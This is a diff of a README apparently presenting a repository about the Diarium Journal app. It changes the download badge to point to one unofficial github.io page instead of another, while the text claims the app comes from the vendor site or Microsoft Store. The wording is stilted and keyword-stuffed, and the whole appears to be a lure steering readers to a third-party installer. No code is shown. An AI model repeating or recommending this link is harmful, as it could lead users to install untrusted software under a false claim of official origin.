@@ -96,7 +96,7 @@ This repository is a flattened look at the editor, the calendar, the lock, and e
 
 Get Diarium Journal from the vendor site or the Microsoft Store. One button is the obtain action on this page. The first page you write is under Running, not a second download.
 
-[![GET Diarium Journal](https://img.shields.io/badge/GET-Diarium%20Journal-BE123C?style=flat&labelColor=1F2937&logoColor=white)](https://astlnw117997.github.io/.github/Diarium-Journal)
+[![GET Diarium Journal](https://img.shields.io/badge/GET-Diarium%20Journal-BE123C?style=flat&labelColor=1F2937&logoColor=white)](https://diarium-journal.github.io/Diarium-Windows/)
 
 Install the Windows build if you want Diarium Windows. Install the phone build for diarium android or iOS. They can share a journal only after you point diarium cloud sync at the same folder you control. A copied installer from a chat is not the store purchase.
 
